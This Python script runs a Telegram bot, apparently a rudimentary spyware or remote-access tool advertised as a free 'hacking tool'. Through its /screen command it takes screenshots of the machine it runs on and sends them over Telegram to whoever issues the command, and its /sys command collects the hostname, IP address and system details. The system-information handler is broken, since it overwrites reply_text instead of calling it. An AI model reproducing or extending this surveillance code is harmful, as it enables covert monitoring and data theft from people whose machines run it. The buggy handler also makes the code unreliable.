import telegram.ext
import pyautogui
import datetime
import platform
import socket

with open('token.txt', 'r') as f:
    TOKEN = f.read()


def system_information(update, context):
    try:
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        plat = platform.processor()
        system = platform.system()
        machine = platform.machine()

    except Exception as e:
        update.message.reply_text(f"Error: {e}")

    update.message.reply_text = (
        f"System Information:\n\n"
        f"Hostname: {hostname}\n"
        f"IP Address: {ip}\n"
        f"Processor: {plat}\n"
        f"System: {system}\n"
        f"Machine: {machine}")

    update.message.reply_text("done")


def take_screenshot():
    # Naming file as time
    current_time = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    # Take a screenshot and save it
    screenshot = pyautogui.screenshot()
    screenshot.save(f"{current_time}.png")
    return f"{current_time}.png"


def start(update, context):
    update.message.reply_text("Hello! welcome to hack505!")


def help(update, context):
    update.message.reply_text("""
	/start
/help
/content
	""")


def content(update, context):
    update.message.reply_text(
        "here you can find the ulimate hacking tool for free of cost!")


def screenshot(update, context):
    try:
        image_path = take_screenshot()
        update.message.reply_photo(photo=open(image_path, 'rb'))
    except Exception as e:
        update.message.reply_text(f"Error: {e}")


def kamesh(update, context):
    update.message.reply_text(
        "my name is kamesh")


updater = telegram.ext.Updater(TOKEN, use_context=True)
disp = updater.dispatcher

disp.add_handler(telegram.ext.CommandHandler('start', start))
disp.add_handler(telegram.ext.CommandHandler("help", help))
disp.add_handler(telegram.ext.CommandHandler("content", content))
disp.add_handler(telegram.ext.CommandHandler("kamesh", kamesh))
# Add the new command handler
disp.add_handler(telegram.ext.CommandHandler("screen", screenshot))
disp.add_handler(telegram.ext.CommandHandler("sys", system_information))


updater.start_polling()
updater.idle()
